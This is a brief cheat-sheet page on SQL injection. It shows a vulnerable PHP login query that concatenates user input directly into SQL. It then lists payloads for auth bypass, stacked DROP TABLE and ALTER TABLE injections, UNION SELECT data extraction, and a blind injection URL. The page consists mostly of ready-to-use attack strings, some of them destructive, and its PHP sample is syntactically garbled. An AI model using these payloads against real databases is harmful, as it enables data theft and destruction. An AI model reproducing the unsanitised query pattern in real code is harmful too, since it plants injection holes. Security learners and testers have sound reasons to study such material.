# SQL Injection
[HOME](/index.html) / [Web](/Web)

## The basics

How an example of unsecure sql statement looks like:

<pre>
$SQL = "SELECT * FROM <i>{tablename}</i> WHERE <i>{username}</i> = ' + <b><i>$_POST["username"]</i></b> + ' AND ' + <b><i>$_POST['password']</i></b>'";
</pre>

To break the statement:

<pre>
$SQL = "SELECT * FROM <i>{tablename}</i> WHERE <i>{username}</i> = ' + <b><i>1' OR 1+1--</i></b> + ' AND ' + <b><i>$_POST['password']</i></b>'";
</pre>

### Simple SQL injection test
```SQL
'
1' OR 1+1--
\'
```
### Stacked injection; Where table name is known
```SQL
1'; DROP TABLE {tablename} --
```
### Where column name is known
```SQL
1'; ALTER TABLE {tablename} ALTER COLUMN {columnname} {datatype} --
1' UNION SELECT {columnname} FROM {tablename};--
1' UNION ALL SELECT {columnname} FROM {tablename};--
```

<br>

## Blind injection
Apply in URL
```SQL
www.example.com/xxx.php?id=1 or 1=1
```

